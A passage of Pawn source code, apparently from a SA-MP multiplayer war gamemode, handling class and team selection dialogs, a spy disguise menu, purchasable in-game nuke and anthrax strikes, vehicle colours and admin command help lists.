				else
				{
                   	ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
                   	SendClientMessage(playerid, red,"You need to have rank 7 to use this class!");
				}

		   }
		   case 3:
		   {
                if(GetPlayerScore(playerid) >= 1500)
                {
				   	gClass[playerid] = ENGINEER;
				   	SendClientMessage(playerid, -1,"You have chosen Engineer class");
				   	SendClientMessage(playerid, -1,"BONUS: Can drive rhino!");
				   	SpawnPlayer(playerid);
				   	UpdateLabelText(playerid);
				}
				else
				{
                   	ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
                   	SendClientMessage(playerid, red,"You need to have rank 4 to use this class!");
				}

           }
		   case 4:
		   {
                if(GetPlayerScore(playerid) >= 2500)
                {
				   	gClass[playerid] = JET;
				   	SendClientMessage(playerid, -1,"You have chosen JetTrooper class");
				   	SendClientMessage(playerid, -1,"BONUS: Can use /jp to spawn jetpack.");
				   	SpawnPlayer(playerid);
				   	UpdateLabelText(playerid);
				}
				else
				{
                   	ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
                   	SendClientMessage(playerid, red,"You need to have rank 5 to use this class!");
				}

			}
		    case 5:
		    {
                if(GetPlayerScore(playerid) >= 2500)
                {
				   	gClass[playerid] = SP;
				   	SendClientMessage(playerid, -1,"You have chosen Support class");
				   	SendClientMessage(playerid, -1,"BONUS: Use /Shelp For Supporter Commands.");
				   	SpawnPlayer(playerid);
				   	UpdateLabelText(playerid);
				}
				else
				{
                   	ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
                   	SendClientMessage(playerid, red,"You need to have rank 5 to use this class!");
				}
            }
		    case 6:
		    {
            	if(GetPlayerScore(playerid) >= 5000)
                {
					gClass[playerid] = SCOUT;
				    SendClientMessage(playerid, -1,"You have chosen Scout class");
				    SendClientMessage(playerid, -1,"BONUS: Can Drive Sea Sparrow.");
				    SpawnPlayer(playerid);
				    UpdateLabelText(playerid);
				}
				else
				{
                    ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
                    SendClientMessage(playerid, red,"You need to have rank 6 to use this class!");
				}
           }
           case 7:
		   {
     			if(GetPlayerScore(playerid) >= 5000)
                {
				   	gClass[playerid] = AG;
				   	SendClientMessage(playerid, -1,"You have chosen Spy class");
				   	SendClientMessage(playerid, -1,"BONUS: /Dis to disguise.");
				   	SpawnPlayer(playerid);
				   	UpdateLabelText(playerid);
				}
				else
				{
                   	ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
                   	SendClientMessage(playerid, red,"You need to have rank 6 to use this class!");
				}

           }
		   case 8:
		   {
                if(PlayerInfo[playerid][dRank] >= 2)
                {
				   	gClass[playerid] = DONOR;
				   	SendClientMessage(playerid, -1,"Donor Class");
				   	SendClientMessage(playerid, -1,"BONUS: Can Drive All Vehicles.");
				   	SendClientMessage(playerid, -1,"Use /DCmds For Donor Commands.");
				   	SpawnPlayer(playerid);
				   	UpdateLabelText(playerid);
				}
				else
				{
                   	ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
                   	SendClientMessage(playerid, red,"You Need Atleast Donor Rank 2 For This Class!");
				}
		   }
	   }
   }
}



if(dialogid == 1432)
{
   if(!response)
   {
   SCM(playerid,red,"You have to choose your team.");
    new String[150];
	new team1count = GetTeamCount(TEAM_EURASIA);
    new team2count = GetTeamCount(TEAM_USA);
    new team3count = GetTeamCount(TEAM_ARAB);
    new team4count = GetTeamCount(TEAM_SOVIET);
    new team5count = GetTeamCount(TEAM_AUS);
    new team6count = GetTeamCount(TEAM_MARVEL);
	format(String, sizeof(String),""cblue"Usa [P:%d]\n"cgreen"Eurasia [P:%d]\n"cyellow"Arabica [P:%d]\n"cred"Soviet [P:%d]\n"cpurple"Austraillia [P:%d]\n"corange" India [P:%d]",team2count, team1count, team3count, team4count, team5count,team6count);
	ShowPlayerDialog(playerid, 1432, DIALOG_STYLE_LIST, "Select Team",String,"Select","Back");
   }
   else if(response)
   {
    switch(listitem)
	   {
		   case 0:
		   {
                   gTeam[playerid] = TEAM_USA;
			       SetPlayerTeam(playerid,3);
			       Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                   ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
		   }
		   case 1:
		   {
                   gTeam[playerid] = TEAM_EURASIA;
				   SetPlayerTeam(playerid,0);
				   Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                   ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
		   }
		   case 2:
		   {
                   gTeam[playerid] = TEAM_ARAB;
				   SetPlayerTeam(playerid,1);
				   Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                   ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");

		   }
		   case 3:
		   {
                   gTeam[playerid] = TEAM_SOVIET;
				   SetPlayerTeam(playerid,2);
				   Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                   ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");

           }
              case 4:
		   {
                   gTeam[playerid] = TEAM_MARVEL;
				   SetPlayerTeam(playerid,2);
				   Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                   ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");

           }
		   case 5:
		   {
				   gTeam[playerid] = TEAM_AUS;
				   SetPlayerTeam(playerid,4);
				   Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                   ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 6\n"ccolor"Engineer - "ccolor2"Rank 5\n"ccolor"JetTrooper - "ccolor2"Rank 6\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 5\n"ccolor"Spy - "ccolor2"Rank 7\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
		   }
	   }
   }
}

if(dialogid == 1541)
{
   if(!response)
   {
   SendClientMessage(playerid,red,"Canceled");
   }
   else if(response)
   {
    switch(listitem)
	   {
		   case 0:
		   {
            new string[13];
            SendClientMessage(playerid,TEAM_USA_COLOR,"Disguise as Usa Aussalt");
            format(string, sizeof(string),"%s\nAssault",GetRankName(playerid));
            Dis[playerid] = Create3DTextLabel(" ", TEAM_USA_COLOR, 30.0, 40.0, 50.0, 40.0, 0);
            Attach3DTextLabelToPlayer(Dis[playerid], playerid, 0.0, 0.0, 0.5);
            SetPlayerSkin(playerid, 287);
			SetPlayerColor(playerid, TEAM_USA_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		   }
		   case 1:
		   {
             new string[13];
             SendClientMessage(playerid,TEAM_EURASIA_COLOR,"Disguise as Eurasia Aussalt");
            format(string, sizeof(string),"%s\nAssault",GetRankName(playerid));
            Dis[playerid] = Create3DTextLabel(" ", TEAM_EURASIA_COLOR, 30.0, 40.0, 50.0, 40.0, 0);
            Attach3DTextLabelToPlayer(Dis[playerid], playerid, 0.0, 0.0, 0.5);
            SetPlayerSkin(playerid, 73);
			SetPlayerColor(playerid, TEAM_EURASIA_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		   }
		   case 2:
		   {
            new string[13];
            SendClientMessage(playerid,TEAM_ARAB_COLOR,"Disguise as Arabic Aussalt");
            format(string, sizeof(string),"%s\nAssault",GetRankName(playerid));
            Dis[playerid] = Create3DTextLabel(" ", TEAM_ARAB_COLOR, 30.0, 40.0, 50.0, 40.0, 0);
            Attach3DTextLabelToPlayer(Dis[playerid], playerid, 0.0, 0.0, 0.5);
            SetPlayerSkin(playerid, 179);
			SetPlayerColor(playerid, TEAM_ARAB_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		   }
		   case 3:
		   {
		    new string[13];
		    SendClientMessage(playerid,TEAM_SOVIET_COLOR,"Disguise as Soviet Aussalt");
            format(string, sizeof(string),"%s\nAssault",GetRankName(playerid));
            Dis[playerid] = Create3DTextLabel(" ", TEAM_SOVIET_COLOR, 30.0, 40.0, 50.0, 40.0, 0);
            Attach3DTextLabelToPlayer(Dis[playerid], playerid, 0.0, 0.0, 0.5);
            SetPlayerSkin(playerid, 285);
			SetPlayerColor(playerid, TEAM_SOVIET_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
           }
            case 4:
		   {
		    new string[13];
		    SendClientMessage(playerid,TEAM_MARVEL_COLOR,"Disguise as Vietnam Aussalt");
            format(string, sizeof(string),"%s\nAssault",GetRankName(playerid));
            Dis[playerid] = Create3DTextLabel(" ", TEAM_MARVEL_COLOR, 30.0, 40.0, 50.0, 40.0, 0);
            Attach3DTextLabelToPlayer(Dis[playerid], playerid, 0.0, 0.0, 0.5);
            SetPlayerSkin(playerid, 122);
			SetPlayerColor(playerid, TEAM_MARVEL_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
           }
		   case 5:
		   {
		    new string[13];
		    SendClientMessage(playerid,TEAM_AUS_COLOR,"Disguise as Austraillia Aussalt");
            format(string, sizeof(string),"%s\nAssault",GetRankName(playerid));
            Dis[playerid] = Create3DTextLabel(" ", TEAM_AUS_COLOR, 30.0, 40.0, 50.0, 40.0, 0);
            Attach3DTextLabelToPlayer(Dis[playerid], playerid, 0.0, 0.0, 0.5);
            SetPlayerSkin(playerid, 206);
	    	SetPlayerColor(playerid, TEAM_AUS_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
	      }
	   }
   }
}

if(dialogid == 666)
    {
        if(response)
        {
            if(GetPlayerMoney(playerid) >= 400000)
			{
			if(GetPlayerScore(playerid) >= 2000)
			{
			    GivePlayerMoney(playerid, -400000);
			    SendClientMessageToAll(GREEN,"Anthrax has been launch in San Andreas.");
		    	new name[MAX_PLAYER_NAME];
			    GetPlayerName(playerid, name, sizeof(name));
			    new string[128];
	            format(string, sizeof(string), "%s Has ~g~Launched ~r~Anthrax!", name);
  				SendBoxMessage(string);
				anthrax_time = 300;
				SetWeather(43);
			    foreach(Player, i)
				{
				    if(gTeam[i]!= gTeam[playerid])
				    {
	            		new Float:hp[MAX_PLAYERS];
					    GetPlayerHealth(i, hp[i]);
					    SetPlayerHealth(i, hp[i]-75);
						GameTextForPlayer(i, "~g~You Are ~r~Infected", 4000, 3);
						if(hp[i] <= 0)
						{
							SendDeathMessage(playerid,i,51);
							GivePlayerMoney(playerid, 1567);
							new String[100];
							GivePlayerScore(playerid, 3);
							format(String,sizeof(String),"Anthrax killed %s +3 Score Earned +1567$", GetName(i));
							SCM(playerid, green, String);
						}
					}else return false;
				}
				}else SendClientMessage(playerid, RED, "You Need To Be Rank 7 to launch Anthrax!");
			}else SendClientMessage(playerid, red, "You Need 400000$ Cash For This!");
		}
	}

if(dialogid == 991)
{
   if(!response)
   {
	   SendClientMessage(playerid, red,"Canceled.");
   }
   else if(response)
   {
    switch(listitem)
	   {
		   case 0:
		   {
             if(GetPlayerScore(playerid) >= 1500)
					{
             if(GetPlayerMoney(playerid) >= 200000)
					{
                        SendClientMessageToAll(TEAM_USA_COLOR,"Nuke has been launched to USA base.");
					    GivePlayerMoney(playerid, -200000);
					    nuke_time = 2000;
					    SetWeather(19);
					    SCM(playerid,RED,"You Have Been Charged $200000 For Nuclear Rocket!");
					    foreach(Player, i)
						{
					  		if(IsPlayerInArea(i,-353.515625,2574.21875,-113.28125,2796.875))
							{
                                SetPlayerHealth(i, 0);
							    new Float:x, Float:y, Float:z;
							    GetPlayerPos(i, x, y, z);
							    CreateExplosion(x, y, z, 12, 10.0);
							    GameTextForPlayer(i, "~r~NUKE", 4000, 3);
								SendDeathMessage(playerid,i,44);
								GivePlayerMoney(playerid, 100);
								new String[60];
								SetPlayerScore(playerid, GetPlayerScore(playerid) +1);
								format(String,sizeof(String),"Nuke Has killed %s | Earned +1 Score +100$", GetName(i));
								SCM(playerid, green, String);

              	}

						}
					}else SendClientMessage(playerid, RED, "You Need To Have $200000 To Launch The Nuke!");
				}else SendClientMessage(playerid, RED, "You Need To Be Rank 6 To Launch The Nuke!");
                }
		   case 1:
		   {
             if(GetPlayerScore(playerid) >= 1500)
					{
             if(GetPlayerMoney(playerid) >= 200000)
     {
                       SendClientMessageToAll(TEAM_EURASIA_COLOR,"Nuke has been launch to EURASIA base.");
					    GivePlayerMoney(playerid, -200000);
					    nuke_time = 2000;
					    SetWeather(19);
					    SCM(playerid,RED,"You Have Been Charged $200000 For Nuclear Rocket!");
					    foreach(Player, i)
						{
					  		if(IsPlayerInArea(i,994.1957, 1817.512, 1185.533, 2049.596))
							{
                                SetPlayerHealth(i, 0);
							    new Float:x, Float:y, Float:z;
							    GetPlayerPos(i, x, y, z);
							    CreateExplosion(x, y, z, 12, 10.0);
							    GameTextForPlayer(i, "~r~NUKE", 4000, 3);
								SendDeathMessage(playerid,i,44);
								GivePlayerMoney(playerid, 100);
								new String[60];
								SetPlayerScore(playerid, GetPlayerScore(playerid) +1);
								format(String,sizeof(String),"Nuke Has Killed %s You Earned 1 Score And 100$", GetName(i));
								SCM(playerid, green, String);

              	}

						}
					}else SendClientMessage(playerid, RED, "You Need To Have  $200000 To Launch The Nuke!");
				}else SendClientMessage(playerid, RED, "You Need To Be Rank 6 To Launch The Nuke!");
                }
		   case 2:
		   {
                if(GetPlayerScore(playerid) >= 1500)
					{
             if(GetPlayerMoney(playerid) >= 200000)
					{
                        SendClientMessageToAll(TEAM_ARAB_COLOR,"Nuke has been launch to ARABIA base.");
					    GivePlayerMoney(playerid, -200000);
					    nuke_time = 2000;
					    SetWeather(19);
					    SCM(playerid,RED,"You Have Been Charged $200000 For Nuclear Rocket!");
					    foreach(Player, i)
						{
					  if(IsPlayerInArea(i,-875.8406, 1389.667, -607.2495, 1623.225))
							{
                                SetPlayerHealth(i, 0);
							    new Float:x, Float:y, Float:z;
							    GetPlayerPos(i, x, y, z);
							    CreateExplosion(x, y, z, 12, 10.0);
							    GameTextForPlayer(i, "~r~NUKE", 4000, 3);
								SendDeathMessage(playerid,i,44);
								GivePlayerMoney(playerid, 100);
								new String[60];
								SetPlayerScore(playerid, GetPlayerScore(playerid) +1);
								format(String,sizeof(String),"Nuke Has Killed %s You Earned 1 Score And 100$", GetName(i));
								SCM(playerid, green, String);

              	}

						}
					}else SendClientMessage(playerid, RED, "You Need To Have  $200000 To Launch The Nuke!");
				}else SendClientMessage(playerid, RED, "You Need To Be Rank 6 To Launch The Nuke!");
                }
		   case 3:
		   {
                if(GetPlayerScore(playerid) >= 1500)
					{
             if(GetPlayerMoney(playerid) >= 200000)
					{
                        SendClientMessageToAll(TEAM_SOVIET_COLOR,"Nuke has been launch to SOVIET base.");
					    GivePlayerMoney(playerid, -200000);
					    nuke_time = 2000;
					    SetWeather(19);
					    SCM(playerid,RED,"You Have Been Charged $200000 For Nuclear Rocket!");
					    foreach(Player, i)
						{
					  if(IsPlayerInArea(i,-309.375,1024.21875,103.125,1211.71875))
							{
                                SetPlayerHealth(i, 0);
							    new Float:x, Float:y, Float:z;
							    GetPlayerPos(i, x, y, z);
							    CreateExplosion(x, y, z, 12, 10.0);
							    GameTextForPlayer(i, "~r~NUKE", 4000, 3);
								SendDeathMessage(playerid,i,44);
								GivePlayerMoney(playerid, 100);
								new String[60];
								SetPlayerScore(playerid, GetPlayerScore(playerid) +1);
								format(String,sizeof(String),"Nuke Has Killed %s You Earned 1 Score And 100$", GetName(i));
								SCM(playerid, green, String);

              	}

						}
					}else SendClientMessage(playerid, RED, "You Need To Have  $200000 To Launch The Nuke!");
				}else SendClientMessage(playerid, RED, "You Need To Be Rank 6 To Launch The Nuke!");
                }
		   case 4:
		   {
                if(GetPlayerScore(playerid) >= 1500)
					{
             if(GetPlayerMoney(playerid) >= 200000)
					{
                        SendClientMessageToAll(TEAM_ZONE_AUS_COLOR,"Nuke has been launch to AUSTRAILLIA base.");
					    GivePlayerMoney(playerid, -200000);
					    nuke_time = 2000;
					    SetWeather(19);
					    SCM(playerid,RED,"You Have Been Charged $200000 For Nuclear Rocket!");
					    foreach(Player, i)
						{
					  if(IsPlayerInArea(i,89.0625000000005,2418.75,466.40625,2617.96875))
							{
                                SetPlayerHealth(i, 0);
							    new Float:x, Float:y, Float:z;
							    GetPlayerPos(i, x, y, z);
							    CreateExplosion(x, y, z, 12, 10.0);
							    GameTextForPlayer(i, "~r~NUKE", 4000, 3);
								SendDeathMessage(playerid,i,44);
								GivePlayerMoney(playerid, 100);
								new String[60];
								SetPlayerScore(playerid, GetPlayerScore(playerid) +1);
								format(String,sizeof(String),"Nuke Has Killed %s You Earned 1 Score And 100$", GetName(i));
								SCM(playerid, green, String);

              	}

						}
					}else SendClientMessage(playerid, RED, "You Need To Have  $200000 To Launch The Nuke!");
				}else SendClientMessage(playerid, RED, "You Need To Be Rank 6 To Launch The Nuke!");
		   }
	    case 5:
		   {
                if(GetPlayerScore(playerid) >= 1500)
					{
             if(GetPlayerMoney(playerid) >= 200000)
					{
                        SendClientMessageToAll(TEAM_MARVEL_COLOR,"Nuke has been launch to VIETNAM base.");
					    GivePlayerMoney(playerid, -200000);
					    nuke_time = 2000;
					    SetWeather(19);
					    SCM(playerid,RED,"You Have Been Charged $200000 For Nuclear Rocket!");
					    foreach(Player, i)
						{
					  if(IsPlayerInArea(i,-309.375,1024.21875,103.125,1211.71875))
							{
                                SetPlayerHealth(i, 0);
							    new Float:x, Float:y, Float:z;
							    GetPlayerPos(i, x, y, z);
							    CreateExplosion(x, y, z, 12, 10.0);
							    GameTextForPlayer(i, "~r~NUKE", 4000, 3);
								SendDeathMessage(playerid,i,44);
								GivePlayerMoney(playerid, 100);
								new String[60];
								SetPlayerScore(playerid, GetPlayerScore(playerid) +1);
								format(String,sizeof(String),"Nuke Has Killed %s You Earned 1 Score And 100$", GetName(i));
								SCM(playerid, green, String);

              	}

						}
					}else SendClientMessage(playerid, RED, "You Need To Have  $200000 To Launch The Nuke!");
				}else SendClientMessage(playerid, RED, "You Need To Be Rank 6 To Launch The Nuke!");
                }
	   }
   }
}
switch(dialogid) // Lookup the dialogid
{
        case 245:
        {
            if(!response)
            {
                SendClientMessage(playerid, red,"You Canceled!");
                return 1; // We processed it
            }
             switch(listitem) // This is far more efficient than using an if-elseif-else structure
             {
                case 0:
                {
                  ChangeVehicleColor(GetPlayerVehicleID(playerid), 1, 1);
        	    }
        	    case 1:
        	    {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 236, 236);
                }
                case 2:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 79, 79);
                }
                case 3:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 6, 6);
                }
                case 4:
				{
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 55, 55);
                }
                case 5:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 147, 147);
                }
                case 6:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 3, 3);
                }
                case 7:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 183, 183);
                }
                case 8:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 186, 186);
                }
                case 9:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 91, 91);
                }
                case 10:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 000, 000);
                }
              }
         }
         case 786:
        {
            if(!response)
            {
                SendClientMessage(playerid, red,"You Canceled!");
                return 1; // We processed it
            }
             switch(listitem) // This is far more efficient than using an if-elseif-else structure
             {
                case 0:
                {
 if(PlayerInfo[playerid][Level] >= 1)
	{
		SendClientMessage(playerid,blue,"    ---=Level 1 Admin Commands =---");
 SendClientMessage(playerid,lightblue,"kick, warn, adminduty, .[test], asay, serverinfo, lockcar, unlockcar ,repair");
 SendClientMessage(playerid,lightblue,"sv, getid, getinfo, flip, lp, ltc, lnos, ltune, reports, jail, unjail, goto, explode, slap");
 SendClientMessage(playerid,lightblue,"lbike, lplane, lcar, lboat, lheli, apm, sban");
			}
	return 1;
}

        	    case 1:
        	    {
	if(PlayerInfo[playerid][Level] >= 2)
	{
		SendClientMessage(playerid,blue,"    ---=Level 2 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"giveweapon, setcolour, lockcar, unlockcar, burn, spawn, disarm, lcar, lbike,");
		SendClientMessage(playerid,lightblue,"lheli, lboat, lplane, screen, jetpack, flip, forceteam, forceclass");
		SendClientMessage(playerid,lightblue,"goto, vgoto, lgoto, fu, kick, warn, slap, jailed, frozen, mute, unmute, muted,");
		SendClientMessage(playerid,lightblue,"laston, ls, lsof, lsv, clearchat, lmenu, ltele, cm, ltmenu,");
		SendClientMessage(playerid,lightblue,"write, explode, burn, ban, unban, unbanip, sban, bannick, sfile");
	}
	return 1;
}

                case 2:
                {
	if(PlayerInfo[playerid][Level] >= 3)
	{
		SendClientMessage(playerid,blue,"    ---=Level 3 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"sethealth, setarmour, setcash, setskin, setwanted, setweather,");
		SendClientMessage(playerid,lightblue,"settime, setworld, setinterior, force, eject, bankrupt, sbankrupt, ubound, lweaps,");
		SendClientMessage(playerid,lightblue,"lammo, car, carhealth, carcolour, setping, destroycar,");
		SendClientMessage(playerid,lightblue,"teleplayer, vget, givecar, gethere, get, jail, unjail, freeze, ");
		SendClientMessage(playerid,lightblue,"unfreeze, akill,aka, disablechat, ban, clearallchat, caps, move, moveplayer, healall,");
		SendClientMessage(playerid,lightblue,"setallweather, setalltime, setallworld, unfreezeall");
		SendClientMessage(playerid,lightblue,"lweather, ltime, lweapons,changename, hunter, hydra");
	}
	return 1;
}
                case 3:
                {
	if(PlayerInfo[playerid][Level] >= 4)
	{
		SendClientMessage(playerid,blue,"    ---=Level 4 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"enable, disable, ban, crash, spam, god, godcar, die, uconfig,");
		SendClientMessage(playerid,lightblue,"botcheck, forbidname, forbidword, rangweapon ");
		SendClientMessage(playerid,lightblue,"fakedeath, spawnall, muteall, unmuteall, getall, killall, freezeall, Giveallweapon, Armourall, GiveAllcash.");
		SendClientMessage(playerid,lightblue,"kickall, slapalll, explodeall, disarmall, ejectall, rheal");
		SendClientMessage(playerid,lightblue,"gsteam, gcteam, fteam, steam, gteam, dteam, announce, announce2");
	}
	return 1;
}

                case 4:
				{
		if(PlayerInfo[playerid][Level] >= 5)
	{
		SendClientMessage(playerid,blue,"    ---=Level 5 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"god, sgod, pickup, object, fakechat, setallscore, saveallstats, setpass");
		SendClientMessage(playerid,lightblue,"setop, unsetop, setlevel, settemplevel , setkills, setdeaths, rban, setname, @ for l5 chat");
	}
	return 1;
}
      case 5:
				{
				if(PlayerInfo[playerid][Level] >= 6)
	{
		SendClientMessage(playerid,blue,"    ---=Level 6 Admin Commands =---");
		SendClientMessage(playerid,lightblue," Admin level 1-5 cmds.");
	}
	return 1;
}
              }
         }
/*
		case 125:
		{
		   if(!response)
		   {
                Kick(playerid);
           }
		   if (udb_Exists(PlayerName2(playerid))) {
              if (udb_CheckLogin(PlayerName2(playerid),inputtext))
	          {
		       new file[256], tmp3[100], string[128];
	   	       format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );
   		       GetPlayerIp(playerid,tmp3,100);
	   	       dini_Set(file,"ip",tmp3);
		       LoginPlayer(playerid);
		       PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		       if(PlayerInfo[playerid][Level] > 0) {
			       format(string,sizeof(string),"Logged In As An Administrator. (Level %d)", PlayerInfo[playerid][Level] );
			       new text[128];
		       format(text, sizeof(text), "You Are Rank %s. Good Luck!", GetRankName(playerid));
	         	SendClientMessage(playerid, COLOR_PINK, text);
			       return SendClientMessage(playerid,red,string);
